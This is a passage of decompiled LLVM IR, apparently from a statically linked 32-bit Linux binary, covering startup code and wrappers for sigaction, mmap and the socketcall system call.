  %v0_805409a = load i32, i32* @global_var_805694c.236, align 4
  store i32 %v0_805409a, i32* @ecx, align 4
  %v1_80540a0 = icmp eq i32 %v0_805409a, 0
  br i1 %v1_80540a0, label %dec_label_pc_80540a9, label %dec_label_pc_80540a4

dec_label_pc_80540a4:                             ; preds = %dec_label_pc_805409a
  %v2_80540a4 = load i32, i32* %stack_var_-16, align 4
  %v1_80540a7 = call i32 @unknown_0(i32 %v2_80540a4)
  br label %dec_label_pc_80540a9

dec_label_pc_80540a9:                             ; preds = %dec_label_pc_80540a4, %dec_label_pc_805409a
  %v2_80540a9 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_80540a9

; uselistorder directives
  uselistorder i32 %v1_8054089, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8054082, { 1, 0 }
}

define i32 @function_80540ad(i32 %arg1) local_unnamed_addr {
dec_label_pc_80540ad:
  ret i32 0
}

define i32 @function_80540b0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80540b0:
  %v0_80540b0 = load i32, i32* @eax, align 4
  ret i32 %v0_80540b0
}

define i32 @function_80540b1() local_unnamed_addr {
dec_label_pc_80540b1:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %v0_80540b1 = load i32, i32* @esi, align 4
  %v0_80540b2 = load i32, i32* @ebx, align 4
  %v0_80540b6 = load i32, i32* @eax, align 4
  store i32 %v0_80540b6, i32* @esi, align 4
  %v0_80540b8 = load i32, i32* @edx, align 4
  store i32 %v0_80540b8, i32* @ebx, align 4
  %v4_80540bd = call i32 @function_805212d(i32 %v0_80540b6, i32 1, i32 %tmp6)
  %v8_80540c5 = icmp eq i32 %v4_80540bd, -1
  %v1_80540c6 = icmp eq i1 %v8_80540c5, false
  br i1 %v1_80540c6, label %dec_label_pc_80540e1, label %dec_label_pc_80540c8

dec_label_pc_80540c8:                             ; preds = %dec_label_pc_80540b1
  %v0_80540ca = load i32, i32* @ebx, align 4
  %v6_80540d0 = call i32 @function_8052302(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80554cc.237, i32 0, i32 0), i32 %v0_80540ca)
  %v1_80540d8 = load i32, i32* @esi, align 4
  %v12_80540d8 = icmp eq i32 %v6_80540d0, %v1_80540d8
  br i1 %v12_80540d8, label %dec_label_pc_80540e1, label %dec_label_pc_80540dc

dec_label_pc_80540dc:                             ; preds = %dec_label_pc_80540c8
  %v0_80540dc = call i32 @function_8053ae5()
  br label %dec_label_pc_80540e1

dec_label_pc_80540e1:                             ; preds = %dec_label_pc_80540c8, %dec_label_pc_80540b1, %dec_label_pc_80540dc
  %v2_80540e1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_80540b2, i32* @ebx, align 4
  store i32 %v0_80540b1, i32* @esi, align 4
  ret i32 %v2_80540e1

; uselistorder directives
  uselistorder i32 ()* @function_8053ae5, { 3, 2, 1, 4, 0 }
  uselistorder i32 (i8*, i32)* @function_8052302, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @function_805212d, { 4, 5, 9, 8, 7, 6, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80540e1, { 2, 0, 1 }
}

define i32 @function_80540e5() local_unnamed_addr {
dec_label_pc_80540e5:
  %v0_80540e8 = load i8, i8* @global_var_8056950.238, align 16
  %v1_80540e8 = icmp eq i8 %v0_80540e8, 0
  %v1_80540ef = icmp eq i1 %v1_80540e8, false
  br i1 %v1_80540ef, label %dec_label_pc_80540e5.dec_label_pc_8054121_crit_edge, label %dec_label_pc_80540f1

dec_label_pc_80540e5.dec_label_pc_8054121_crit_edge: ; preds = %dec_label_pc_80540e5
  %v0_8054124.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8054121

dec_label_pc_80540f1:                             ; preds = %dec_label_pc_80540e5
  store i8 1, i8* @global_var_8056950.238, align 16
  store i32 4096, i32* @global_var_8056944.239, align 4
  br label %dec_label_pc_8054121

dec_label_pc_8054121:                             ; preds = %dec_label_pc_80540e5.dec_label_pc_8054121_crit_edge, %dec_label_pc_80540f1
  %v0_8054124 = phi i32 [ %v0_8054124.pre, %dec_label_pc_80540e5.dec_label_pc_8054121_crit_edge ], [ 0, %dec_label_pc_80540f1 ]
  ret i32 %v0_8054124

; uselistorder directives
  uselistorder i8 1, { 11, 1, 12, 4, 5, 6, 2, 3, 8, 0, 13, 14, 15, 16, 7, 10, 9 }
  uselistorder i8* @global_var_8056950.238, { 1, 0 }
  uselistorder label %dec_label_pc_8054121, { 1, 0 }
}

define i32 @function_8054125(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8054125:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %tmp39 = call i32 @__decompiler_undefined_function_0()
  %tmp44 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %v0_8054126 = load i32, i32* @edi, align 4
  store i32 %tmp44, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_805693c.240, align 4
  store i32 %arg6, i32* @global_var_805694c.236, align 4
  store i32 %arg4, i32* @ebp, align 4
  %v2_805415c = mul i32 %arg2, 4
  %v3_805415c = add i32 %tmp44, %v2_805415c
  %v1_805415f = add i32 %v3_805415c, 4
  store i32 %v1_805415f, i32* @global_var_8056940.241, align 64
  %v3_8054167 = load i32, i32* %arg3, align 4
  %v14_8054167 = icmp eq i32 %v1_805415f, %v3_8054167
  %v1_8054169 = icmp eq i1 %v14_8054167, false
  br i1 %v1_8054169, label %dec_label_pc_8054171, label %dec_label_pc_805416b

dec_label_pc_805416b:                             ; preds = %dec_label_pc_8054125
  store i32 %v3_805415c, i32* @global_var_8056940.241, align 64
  br label %dec_label_pc_8054171

dec_label_pc_8054171:                             ; preds = %dec_label_pc_8054125, %dec_label_pc_805416b
  store i32 0, i32* %stack_var_-168, align 4
  %v2_8054176 = ptrtoint i32* %stack_var_-136 to i32
  %v3_805417b = bitcast i32* %stack_var_-136 to i8*
  %v4_805417b = call i32 @function_805277a(i8* %v3_805417b, i32 0, i32 120)
  %v0_8054180 = load i32, i32* @global_var_8056940.241, align 64
  br label %dec_label_pc_8054188

dec_label_pc_8054188:                             ; preds = %dec_label_pc_8054188, %dec_label_pc_8054171
  %v0_8054188 = phi i32 [ %v1_805418b, %dec_label_pc_8054188 ], [ %v0_8054180, %dec_label_pc_8054171 ]
  %v1_8054188 = inttoptr i32 %v0_8054188 to i32*
  %v2_8054188 = load i32, i32* %v1_8054188, align 4
  %v3_8054188 = icmp eq i32 %v2_8054188, 0
  %v1_805418b = add i32 %v0_8054188, 4
  %v1_805418e = icmp eq i1 %v3_8054188, false
  br i1 %v1_805418e, label %dec_label_pc_8054188, label %dec_label_pc_80541af.preheader

dec_label_pc_80541af.preheader:                   ; preds = %dec_label_pc_8054188
  store i32 %v1_805418b, i32* @ebx, align 4
  %v1_80541af22 = inttoptr i32 %v1_805418b to i32*
  %v2_80541af23 = load i32, i32* %v1_80541af22, align 4
  %v3_80541af24 = icmp eq i32 %v2_80541af23, 0
  %v1_80541b226 = icmp eq i1 %v3_80541af24, false
  br i1 %v1_80541b226, label %dec_label_pc_8054194.lr.ph, label %dec_label_pc_80541b4

dec_label_pc_8054194.lr.ph:                       ; preds = %dec_label_pc_80541af.preheader
  %v3_8054174 = ptrtoint i32* %stack_var_-168 to i32
  %v3_805419f = add i32 %v3_8054174, 32
  br label %dec_label_pc_8054194

dec_label_pc_8054194:                             ; preds = %dec_label_pc_8054194.lr.ph, %dec_label_pc_80541ac
  %v1_805419f = phi i32 [ %v2_80541af23, %dec_label_pc_8054194.lr.ph ], [ %v2_80541af, %dec_label_pc_80541ac ]
  %v0_805419e = phi i32 [ %v1_805418b, %dec_label_pc_8054194.lr.ph ], [ %v1_80541ac, %dec_label_pc_80541ac ]
  %v6_8054199 = icmp ugt i32 %v1_805419f, 14
  br i1 %v6_8054199, label %dec_label_pc_80541ac, label %dec_label_pc_805419b

dec_label_pc_805419b:                             ; preds = %dec_label_pc_8054194
  store i32 %v0_805419e, i32* %stack_var_-168, align 4
  %v2_805419f = mul i32 %v1_805419f, 8
  %v4_805419f = add i32 %v3_805419f, %v2_805419f
  %v3_80541a4 = inttoptr i32 %v4_805419f to i16*
  %v4_80541a4 = call i32 @function_8054972(i16* %v3_80541a4, i32 %v0_805419e, i32 8)
  %v0_80541ac.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80541ac

dec_label_pc_80541ac:                             ; preds = %dec_label_pc_8054194, %dec_label_pc_805419b
  %v0_80541ac = phi i32 [ %v0_805419e, %dec_label_pc_8054194 ], [ %v0_80541ac.pre, %dec_label_pc_805419b ]
  %v1_80541ac = add i32 %v0_80541ac, 8
  store i32 %v1_80541ac, i32* @ebx, align 4
  %v1_80541af = inttoptr i32 %v1_80541ac to i32*
  %v2_80541af = load i32, i32* %v1_80541af, align 4
  %v3_80541af = icmp eq i32 %v2_80541af, 0
  %v1_80541b2 = icmp eq i1 %v3_80541af, false
  br i1 %v1_80541b2, label %dec_label_pc_8054194, label %dec_label_pc_80541b4

dec_label_pc_80541b4:                             ; preds = %dec_label_pc_80541ac, %dec_label_pc_80541af.preheader
  store i32 %v2_8054176, i32* @eax, align 4
  %v0_80541b8 = call i32 @function_8054a2d()
  store i32 %v0_80541b8, i32* @eax, align 4
  %v0_80541bd = call i32 @function_80540e5()
  %v1_80541c6 = icmp eq i32 %tmp39, 0
  %v1_80541c8 = icmp eq i1 %v1_80541c6, false
  br i1 %v1_80541c8, label %dec_label_pc_80541ce, label %dec_label_pc_80541ca

dec_label_pc_80541ca:                             ; preds = %dec_label_pc_80541b4
  %v1_80541ca = and i32 %tmp39, -65536
  %v2_80541ca = or i32 %v1_80541ca, 4096
  br label %dec_label_pc_80541ce

dec_label_pc_80541ce:                             ; preds = %dec_label_pc_80541b4, %dec_label_pc_80541ca
  %v0_80541ce = phi i32 [ %tmp39, %dec_label_pc_80541b4 ], [ %v2_80541ca, %dec_label_pc_80541ca ]
  store i32 %v0_80541ce, i32* @global_var_8056944.239, align 4
  %v13_80541d3 = icmp eq i32 %tmp38, -1
  %v1_80541d8 = icmp eq i1 %v13_80541d3, false
  br i1 %v1_80541d8, label %dec_label_pc_8054203, label %dec_label_pc_80541da

dec_label_pc_80541da:                             ; preds = %dec_label_pc_80541ce
  %v0_80541da = call i32 @function_8054751()
  store i32 %v0_80541da, i32* @ebx, align 4
  %v0_80541e1 = call i32 @function_80546c0()
  %v0_80541e6 = load i32, i32* @ebx, align 4
  %v12_80541e6 = icmp eq i32 %v0_80541e6, %v0_80541e1
  %v1_80541e8 = icmp eq i1 %v12_80541e6, false
  br i1 %v1_80541e8, label %dec_label_pc_8054219, label %dec_label_pc_80541ea

dec_label_pc_80541ea:                             ; preds = %dec_label_pc_80541da
  %v0_80541ea = call i32 @function_80546e6()
  store i32 %v0_80541ea, i32* @ebx, align 4
  %v0_80541f1 = call i32 @function_805469a()
  %v0_80541f6 = load i32, i32* @ebx, align 4
  %v12_80541f6 = icmp eq i32 %v0_80541f6, %v0_80541f1
  %v1_80541f8 = icmp eq i1 %v12_80541f6, false
  br i1 %v1_80541f8, label %dec_label_pc_8054219, label %dec_label_pc_80541fa.thread

dec_label_pc_80541fa.thread:                      ; preds = %dec_label_pc_80541ea
  br label %dec_label_pc_8054243

dec_label_pc_8054203:                             ; preds = %dec_label_pc_80541ce
  %v15_8054203 = icmp eq i32 %tmp38, %tmp37
  %v1_8054207 = icmp eq i1 %v15_8054203, false
  br i1 %v1_8054207, label %dec_label_pc_8054219, label %dec_label_pc_8054209

dec_label_pc_8054209:                             ; preds = %dec_label_pc_8054203
  br label %dec_label_pc_8054219

dec_label_pc_8054219:                             ; preds = %dec_label_pc_8054209, %dec_label_pc_8054203, %dec_label_pc_80541ea, %dec_label_pc_80541da
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8054220 = call i32 @function_80540b1()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_805422f = call i32 @function_80540b1()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_805423e = call i32 @function_80540b1()
  br label %dec_label_pc_8054243

dec_label_pc_8054243:                             ; preds = %dec_label_pc_80541fa.thread, %dec_label_pc_8054219
  store i32 ptrtoint (i32* @global_var_80567e4.233 to i32), i32* %esi.global-to-local, align 4
  %v0_8054248 = load i32, i32* @edi, align 4
  %v1_8054248 = inttoptr i32 %v0_8054248 to i32*
  %v2_8054248 = load i32, i32* %v1_8054248, align 4
  store i32 %v2_8054248, i32* bitcast (i32** @global_var_8056868.243 to i32*), align 8
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567e4.233 to i32), i32 -134572004), i32 2), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_8056948.235, align 8
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567e4.233 to i32), i32 -134572004), i32 2), i32 0), label %dec_label_pc_8054268, label %dec_label_pc_8054274

dec_label_pc_8054268:                             ; preds = %dec_label_pc_8054243, %dec_label_pc_8054268
  %v4_8054268 = phi i32 [ %v1_805426f, %dec_label_pc_8054268 ], [ 0, %dec_label_pc_8054243 ]
  %v5_8054268 = mul i32 %v4_8054268, 4
  %v6_8054268 = add i32 %v5_8054268, ptrtoint (i32* @global_var_80567e4.233 to i32)
  %v7_8054268 = inttoptr i32 %v6_8054268 to i32*
  %v8_8054268 = load i32, i32* %v7_8054268, align 4
  call void @__pseudo_call(i32 %v8_8054268)
  %v0_805426f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805426f = add i32 %v0_805426f, 1
  store i32 %v1_805426f, i32* %ebx.global-to-local, align 4
  %v1_8054270 = load i32, i32* %esi.global-to-local, align 4
  %v7_8054270 = icmp ult i32 %v1_805426f, %v1_8054270
  br i1 %v7_8054270, label %dec_label_pc_8054268, label %dec_label_pc_8054274

dec_label_pc_8054274:                             ; preds = %dec_label_pc_8054268, %dec_label_pc_8054243
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567e4.233 to i32), i32 -134572004), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567e4.233 to i32), i32 -134572004), i32 2), i32 0), label %dec_label_pc_805428c, label %dec_label_pc_8054298

dec_label_pc_805428c:                             ; preds = %dec_label_pc_8054274, %dec_label_pc_805428c
  %v4_805428c = phi i32 [ %v1_8054293, %dec_label_pc_805428c ], [ 0, %dec_label_pc_8054274 ]
  store i32 ptrtoint (i32* @global_var_8054293.245 to i32), i32* %stack_var_-168, align 4
  %v5_805428c = mul i32 %v4_805428c, 4
  %v6_805428c = add i32 %v5_805428c, ptrtoint (i32* @global_var_80567e4.233 to i32)
  %v7_805428c = inttoptr i32 %v6_805428c to i32*
  %v8_805428c = load i32, i32* %v7_805428c, align 4
  call void @__pseudo_call(i32 %v8_805428c)
  %v0_8054293 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054293 = add i32 %v0_8054293, 1
  store i32 %v1_8054293, i32* %ebx.global-to-local, align 4
  %v1_8054294 = load i32, i32* %esi.global-to-local, align 4
  %v7_8054294 = icmp ult i32 %v1_8054293, %v1_8054294
  br i1 %v7_8054294, label %dec_label_pc_805428c, label %dec_label_pc_8054298

dec_label_pc_8054298:                             ; preds = %dec_label_pc_805428c, %dec_label_pc_8054274
  %v0_80542a1 = load i32, i32* %stack_var_-168, align 4
  %v1_80542a1 = call i32 @function_8052729(i32 %v0_80542a1)
  %v1_80542a6 = inttoptr i32 %v1_80542a1 to i32*
  store i32 0, i32* %v1_80542a6, align 4
  store i32 0, i32* @eax, align 4
  store i32 0, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %v0_8054126)
  %v0_80542d6 = load i32, i32* @eax, align 4
  %v1_80542d9 = call i32 @function_8053d39(i32 %v0_80542d6)
  %v0_80542e5 = load i32, i32* @ebx, align 4
  %v1_80542e5 = inttoptr i32 %v0_80542e5 to %sigcontext*
  %v2_80542e5 = call i32 @sigreturn(%sigcontext* %v1_80542e5)
  %v0_80542ed = load i32, i32* @ebx, align 4
  %v1_80542ed = inttoptr i32 %v0_80542ed to %sigcontext*
  %v2_80542ed = call i32 @sigreturn(%sigcontext* %v1_80542ed)
  ret i32 %v2_80542ed

; uselistorder directives
  uselistorder i32 %v1_8054293, { 1, 2, 0 }
  uselistorder i32 %v1_805426f, { 1, 2, 0 }
  uselistorder i32 %v2_80541af, { 1, 0 }
  uselistorder i32 %v1_80541ac, { 2, 1, 0 }
  uselistorder i32 %v1_805418b, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8054188, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 (i32)* @function_8053d39, { 0, 2, 1 }
  uselistorder i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567e4.233 to i32), i32 -134572004), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567e4.233 to i32), i32 -134572004), i32 2), { 1, 3, 4, 2, 0 }
  uselistorder i32 ()* @function_80540b1, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 -65536, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9 }
  uselistorder i32 120, { 8, 22, 1, 2, 9, 10, 3, 11, 12, 13, 4, 5, 14, 15, 6, 16, 17, 7, 18, 19, 20, 21, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_805428c, { 1, 0 }
  uselistorder label %dec_label_pc_8054268, { 1, 0 }
  uselistorder label %dec_label_pc_8054243, { 1, 0 }
  uselistorder label %dec_label_pc_80541ce, { 1, 0 }
  uselistorder label %dec_label_pc_80541ac, { 1, 0 }
  uselistorder label %dec_label_pc_8054194, { 1, 0 }
  uselistorder label %dec_label_pc_8054171, { 1, 0 }
}

define i32 @function_80542ef(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80542ef:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_80542ef = load i32, i32* @esi, align 4
  %v0_80542f0 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8054305 = icmp eq i32* %arg2, null
  br i1 %v1_8054305, label %dec_label_pc_8054358, label %dec_label_pc_8054309

dec_label_pc_8054309:                             ; preds = %dec_label_pc_80542ef
  %v2_8054309 = load i32, i32* %arg2, align 4
  store i32 %v2_8054309, i32* %stack_var_-148, align 4
  %v1_8054312 = add i32 %tmp11, 4
  %v3_8054324 = bitcast i32* %stack_var_-136 to i16*
  %v4_8054324 = call i32 @function_8054972(i16* %v3_8054324, i32 %v1_8054312, i32 128)
  %v1_8054329 = add i32 %tmp11, 132
  %v2_8054343 = inttoptr i32 %v1_8054329 to i8*
  %v3_8054343 = load i8, i8* %v2_8054343, align 1
  %v4_8054343 = and i8 %v3_8054343, 4
  %v5_8054343 = icmp eq i8 %v4_8054343, 0
  %v1_805434a = icmp eq i1 %v5_8054343, false
  br i1 %v1_805434a, label %dec_label_pc_8054358, label %dec_label_pc_805434c

dec_label_pc_805434c:                             ; preds = %dec_label_pc_8054309
  br label %dec_label_pc_8054358

dec_label_pc_8054358:                             ; preds = %dec_label_pc_805434c, %dec_label_pc_8054309, %dec_label_pc_80542ef
  %v1_805435a = icmp eq i32 %arg3, 0
  br i1 %v1_805435a, label %dec_label_pc_8054362, label %dec_label_pc_805435e

dec_label_pc_805435e:                             ; preds = %dec_label_pc_8054358
  %v2_805435e = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_8054362

dec_label_pc_8054362:                             ; preds = %dec_label_pc_8054358, %dec_label_pc_805435e
  %v0_8054371 = phi i32 [ 0, %dec_label_pc_8054358 ], [ %v2_805435e, %dec_label_pc_805435e ]
  br i1 %v1_8054305, label %dec_label_pc_805436f, label %dec_label_pc_8054368

dec_label_pc_8054368:                             ; preds = %dec_label_pc_8054362
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_805436f

dec_label_pc_805436f:                             ; preds = %dec_label_pc_8054362, %dec_label_pc_8054368
  %v0_8054372 = phi %sigaction* [ null, %dec_label_pc_8054362 ], [ %phitmp, %dec_label_pc_8054368 ]
  %v5_805437a = call i32 @function_8054415(i32 %arg1, %sigaction* %v0_8054372, i32 %v0_8054371, i32 8)
  store i32 %v5_805437a, i32* %ebx.global-to-local, align 4
  br i1 %v1_805435a, label %dec_label_pc_80543bd, label %dec_label_pc_8054388

dec_label_pc_8054388:                             ; preds = %dec_label_pc_805436f
  %v2_8054388 = icmp slt i32 %v5_805437a, 0
  br i1 %v2_8054388, label %dec_label_pc_80543bd, label %dec_label_pc_805438c

dec_label_pc_805438c:                             ; preds = %dec_label_pc_8054388
  %v3_805438c = load i32, i32* %stack_var_-288, align 4
  %v2_8054390 = inttoptr i32 %arg3 to i32*
  store i32 %v3_805438c, i32* %v2_8054390, align 4
  %v2_8054398 = ptrtoint i32* %stack_var_-276 to i32
  %v1_805439d = add i32 %arg3, 4
  %v3_80543a1 = inttoptr i32 %v1_805439d to i16*
  %v4_80543a1 = call i32 @function_8054972(i16* %v3_80543a1, i32 %v2_8054398, i32 128)
  %v2_80543aa = add i32 %arg3, 132
  %v3_80543aa = inttoptr i32 %v2_80543aa to i32*
  %v2_80543b7 = add i32 %arg3, 136
  %v3_80543b7 = inttoptr i32 %v2_80543b7 to i32*
  %v0_80543bd.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80543bd

dec_label_pc_80543bd:                             ; preds = %dec_label_pc_8054388, %dec_label_pc_805436f, %dec_label_pc_805438c
  %v0_80543bd = phi i32 [ %v5_805437a, %dec_label_pc_8054388 ], [ %v5_805437a, %dec_label_pc_805436f ], [ %v0_80543bd.pre, %dec_label_pc_805438c ]
  store i32 %v0_80542f0, i32* @ebx, align 4
  store i32 %v0_80542ef, i32* @esi, align 4
  ret i32 %v0_80543bd

; uselistorder directives
  uselistorder i32 %v5_805437a, { 0, 1, 3, 2 }
  uselistorder i32 136, { 1, 0, 2 }
  uselistorder i8 4, { 3, 4, 1, 2, 5, 6, 0 }
  uselistorder i32 132, { 1, 2, 0, 3 }
  uselistorder i32 128, { 6, 7, 11, 8, 10, 0, 1, 2, 3, 4, 5, 9 }
  uselistorder i32* null, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 2, 0, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_80543bd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805436f, { 1, 0 }
  uselistorder label %dec_label_pc_8054362, { 1, 0 }
}

define i32 @function_80543c8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_80543c8:
  %stack_var_4 = alloca i32, align 4
  %v0_80543c8 = load i32, i32* @ebx, align 4
  store i32 %v0_80543c8, i32* @edx, align 4
  %v2_80543d3 = load i32, i32* @ecx, align 4
  %v4_80543d3 = load i32, i32* @esi, align 4
  %v5_80543d3 = load i32, i32* @edi, align 4
  %v6_80543d3 = load i32, i32* @ebp, align 4
  %v7_80543d3 = call i32* @mmap(i32* nonnull %stack_var_4, i32 %v2_80543d3, i32 %v0_80543c8, i32 %v4_80543d3, i32 %v5_80543d3, i32 %v6_80543d3)
  %v8_80543d3 = ptrtoint i32* %v7_80543d3 to i32
  store i32 %v0_80543c8, i32* @ebx, align 4
  %v3_80543dc = icmp ugt i32* %v7_80543d3, inttoptr (i32 -4096 to i32*)
  call void @__pseudo_cond_branch(i1 %v3_80543dc, i32 134564469)
  ret i32 %v8_80543d3

; uselistorder directives
  uselistorder i32* @ebp, { 7, 68, 69, 70, 71, 72, 73, 74, 75, 32, 33, 34, 35, 76, 77, 78, 79, 80, 81, 82, 83, 88, 84, 85, 86, 87, 6, 89, 10, 2, 21, 22, 11, 29, 15, 8, 14, 16, 18, 1, 23, 9, 0, 28, 12, 13, 17, 19, 20, 24, 25, 26, 27, 30, 31, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 3, 47, 48, 49, 50, 4, 51, 52, 53, 54, 55, 56, 57, 58, 59, 5, 60, 61, 62, 63, 64, 65, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 110, 108, 109, 111, 112, 113, 114, 115, 66, 67 }
  uselistorder i32* @ecx, { 5, 17, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0, 41, 42, 43, 1, 44, 20, 19, 18, 45, 46, 47, 2, 48, 49, 50, 3, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 7, 8, 4, 9, 10, 11, 62, 12, 13, 14, 15, 16, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 6, 88, 89, 90, 91 }
}

define i32 @function_80543e3(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80543e3:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80543e3 = load i32, i32* @ebx, align 4
  store i32 %v0_80543e3, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_80543f6 = call i32 @int80_syscall(i32 102)
  store i32 %v1_80543f6, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_80543f6, -4095
  br i1 %tmp9, label %dec_label_pc_805440f, label %dec_label_pc_8054403

dec_label_pc_8054403:                             ; preds = %dec_label_pc_80543e3
  %v1_8054403 = call i32 @function_8052729(i32 %v0_80543e3)
  %v0_8054408 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054408 = sub i32 0, %v0_8054408
  %v2_805440a = inttoptr i32 %v1_8054403 to i32*
  store i32 %v1_8054408, i32* %v2_805440a, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054413.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805440f

dec_label_pc_805440f:                             ; preds = %dec_label_pc_80543e3, %dec_label_pc_8054403
  %v2_8054413 = phi i32 [ %v0_80543e3, %dec_label_pc_80543e3 ], [ %v2_8054413.pre, %dec_label_pc_8054403 ]
  %v0_805440f = phi i32 [ %v1_80543f6, %dec_label_pc_80543e3 ], [ -1, %dec_label_pc_8054403 ]
  %v2_8054411 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054411, i32* @edx, align 4
  store i32 %v2_8054413, i32* @ebx, align 4
  ret i32 %v0_805440f

; uselistorder directives
  uselistorder i32 %v1_80543f6, { 1, 0, 2 }
  uselistorder i32 102, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_805440f, { 1, 0 }
}

define i32 @function_8054415(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054415:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_8054416 = load i32, i32* @esi, align 4
  store i32 %v0_8054416, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_805442a = load i32, i32* @ebx, align 4
  %v7_8054432 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_8054432, i32* %esi.global-to-local, align 4
  %tmp14 = icmp ult i32 %v7_8054432, -4095
  br i1 %tmp14, label %dec_label_pc_805444a, label %dec_label_pc_805443e

dec_label_pc_805443e:                             ; preds = %dec_label_pc_8054415
  %v1_805443e = call i32 @function_8052729(i32 %v0_805442a)
  %v0_8054443 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054443 = sub i32 0, %v0_8054443
  %v2_8054445 = inttoptr i32 %v1_805443e to i32*
  store i32 %v1_8054443, i32* %v2_8054445, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_805444d.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805444a

dec_label_pc_805444a:                             ; preds = %dec_label_pc_8054415, %dec_label_pc_805443e
  %v2_805444d = phi i32 [ %v0_8054416, %dec_label_pc_8054415 ], [ %v2_805444d.pre, %dec_label_pc_805443e ]
  %v0_805444a = phi i32 [ %v7_8054432, %dec_label_pc_8054415 ], [ -1, %dec_label_pc_805443e ]
  store i32 %v2_805444d, i32* @esi, align 4
  ret i32 %v0_805444a

; uselistorder directives
  uselistorder i32 %v7_8054432, { 1, 0, 2 }
